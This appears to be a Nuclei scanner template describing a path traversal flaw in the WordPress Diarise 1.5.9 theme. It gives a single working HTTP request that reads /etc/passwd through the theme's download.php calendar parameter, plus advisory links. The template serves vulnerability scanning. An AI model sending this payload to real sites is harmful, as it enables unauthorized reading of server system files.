# Nuclei Template: WordPress Diarise 1.5.9 - Arbitrary File Retrieval
**Template ID:** diarise-theme-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`diarise-theme-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Diarise theme version 1.5.9 suffers from a local file retrieval vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
```

## References
- https://packetstormsecurity.com/files/152773/WordPress-Diarise-1.5.9-Local-File-Disclosure.html
- https://cxsecurity.com/issue/WLB-2019050123
- https://woocommerce.com/?aff=1790
